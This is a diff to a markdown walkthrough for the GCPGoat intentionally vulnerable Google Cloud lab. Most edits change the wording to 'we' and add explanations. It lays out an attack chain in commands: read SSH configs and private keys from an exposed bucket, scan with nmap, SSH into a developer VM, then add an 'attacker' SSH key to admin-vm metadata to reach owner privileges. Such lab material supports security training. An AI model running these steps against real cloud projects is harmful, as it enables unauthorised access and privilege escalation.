@@ -5,33 +5,21 @@ In this Part 02 of the lab, we will use the credentials of a low-privileged virt
 
 #### 1. Explore the Compromised Development Bucket
 
-First, list the contents of the development bucket that was compromised in the previous lab:
+First, we list the contents of the development bucket that was compromised in the previous lab:
 
-  
-
-```bash
-
-gsutil ls -r gs://<DEV_BUCKET_NAME>/
-
-```
 
 ![Development bucket contents showing config.txt file](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-01.png)
 
 
-Note the interesting file **config.txt** in the `.ssh` directory. This could contain sensitive information.
+We notice that there is an interesting file **config.txt** in the `.ssh` directory. This could contain sensitive information.
 
 
 #### 2. Retrieve and Analyze Configuration Files
 
-Access the config.txt file from the bucket:
+We access the config.txt file from the bucket:
 
 ```bash
-
-gsutil cat gs://<DEV_BUCKET_NAME>/shared/files/.ssh/config.txt
-
-# OR via direct HTTPS access
-
-curl https://storage.googleapis.com/<DEV_BUCKET_NAME>/shared/files/.ssh/config.txt
+https://storage.googleapis.com/<DEV BUCKET NAME>/shared/files/.ssh/config.txt
 
 ```
 
@@ -41,7 +29,7 @@ The file contains multiple IP addresses, usernames, and paths to SSH keys.
 
 #### 3. Identify Active Hosts
 
-Scan the IP addresses found in the config file to determine which hosts are accessible:
+with Nmap, we scan the IP addresses found in the config file to determine which hosts are accessible:
 
 ```bash
 
@@ -51,18 +39,18 @@ nmap <IP_ADDRESS> -Pn
 
 ![Nmap scan results showing open port 22](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-03.png)
 
-One of the IP addresses will have port 22 (SSH) open. From the config file, we can identify this as the instance associated with user **justin**.
+One of the IP addresses has port 22 (SSH) open. From the config file, we can identify this as the instance associated with user **justin**.
 
 
 #### 4. Retrieve SSH Key
 
-Download the SSH private key for justin:
+We download the SSH private key for justin, and change the permissions to read-only for the current user only:
 
 ```bash
 
 wget https://storage.googleapis.com/<DEV_BUCKET_NAME>/shared/files/.ssh/keys/justin.pem
 
-chmod 400 justin.pem  # Set appropriate permissions
+chmod 400 justin.pem
 
 ```
 
@@ -72,7 +60,7 @@ chmod 400 justin.pem  # Set appropriate permissions
 
 #### 5. Connect to the Low-Privileged VM
 
-Use the SSH key to access the VM:
+We use the SSH key to access the VM, and the IP address is the the one corresponding to justin in the config file:
 
 ```bash
 
@@ -82,9 +70,11 @@ ssh -i justin.pem justin@<IP_ADDRESS>
 
 ![Successful SSH connection to the VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-05.png)
 
+We logged in successfully as the screen shows.
+
 #### 6. Gather Project Information
 
-Check the VM's service account and project information: 
+Check the VM's service account and project details: 
 
 ```bash
 
@@ -119,7 +109,7 @@ The VM has full access to compute services and read access to storage buckets.
 
 #### 8. Enumerate Compute Instances
 
-List all compute instances in the project:
+We list all compute instances in the project:
  
 
 ```bash
@@ -131,7 +121,9 @@ gcloud compute instances list
 
 ![List of compute instances showing admin-vm](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-08.png)  
 
-We've identified another VM named **admin-vm**. Note the public IP address for this instance. 
+We've identified another VM named **admin-vm**. Keep the public IP address for this instance, we will need it after. 
+
+We will access this VM by modifying its metadata.
 
 ### Phase 4: Privilege Escalation via Metadata Modification 
 
@@ -153,9 +145,7 @@ This creates a public key (key.pub) and private key (key) for a user named "atta
 
 #### 10. Prepare Metadata Update File
 
-
-Create a metadata file with the new SSH key:
- 
+We Create a metadata file with the new SSH key:
 
 ```bash
 
@@ -166,15 +156,14 @@ echo "attacker:$NEWKEY" > ./meta.txt
 cat ./meta.txt  # Verify the contents
 
 ```
-
+We store the public key in the **NEWKEY** variable and the we add the **USER:KEY** data to the **meta.txt** file.
 
 ![Content of meta.txt file showing SSH key](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-10.png)
 
 
 #### 11. Update the Admin VM's Metadata
 
-
-Add the SSH key to the admin VM's metadata:  
+Then, we add the SSH key to the admin VM's metadata, using the below command:  
 
 ```bash
 
@@ -184,11 +173,13 @@ gcloud compute instances add-metadata admin-vm --metadata-from-file ssh-keys=met
 
 ![Adding metadata to the admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-11.png) 
 
-If prompted, confirm the zone selection. 
+This command will add the content of meta.txt in the ssh-keys section of the instance metadata.
+
+If prompted, confirm the zone selection with **Y**. 
 
 #### 12. Verify Metadata Update
 
-Confirm the metadata was successfully updated:
+We confirm that the metadata was successfully updated:
  
 
 ```bash
@@ -212,17 +203,17 @@ Use the newly created SSH key to access the admin VM:
 
 ```bash
 
-ssh -i ./key attacker@<ADMIN_VM_IP>
+ssh -i ./key attacker@<ADMIN_VM_IP> # Replace with the Public IP address of the admin-vm instance
 
 ```  
 
 ![Successfully connected to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-13.png)
 
-You now have access to the admin VM. By default, users added through instance metadata have sudo privileges.  
+We now have access to the admin VM. By default, users added through instance metadata have sudo privileges.  
 
 #### 14. Examine Service Account Privileges 
 
-Check the project and service account information:
+We check the project and service account details again to make sure:
 
 ```bash
 
@@ -236,7 +227,7 @@ The admin VM is using a service account named **admin-service-account**.
 
 #### 15. Examine IAM Policies
 
-Check the permissions assigned to this service account:
+we check the permissions assigned to this service account:
 
 ```bash
 
@@ -247,12 +238,12 @@ gcloud projects get-iam-policy <PROJECT_ID>
 
 ![IAM policy showing owner role](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-15.png)
 
-The admin service account has the **owner** role on the project, which grants full administrative access.
+The admin service account has the **owner** role on the project, which will grant us full administrative access.
 
 #### 16. Verify API Access Scopes
  
 
-Check the access scopes for the admin VM:
+We check the access scopes for the admin VM:
 
 ```bash
 
@@ -271,7 +262,7 @@ The VM has the **cloud-platform** scope, which provides full API access to all G
 
 #### 17. Direct SSH from Developer VM
 
-You can also use the gcloud command to directly SSH to the admin VM:
+We can also use the gcloud command to directly SSH to the admin VM:
 
 
 ```bash
@@ -280,4 +271,8 @@ gcloud compute ssh admin-vm
 
 ```
 
+This command will add the current user to the admin-vm instance by modifying the metadata.
+
 ![Direct SSH access to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-17.png)
+
+We are now logged in to the admin-vm with user justin.
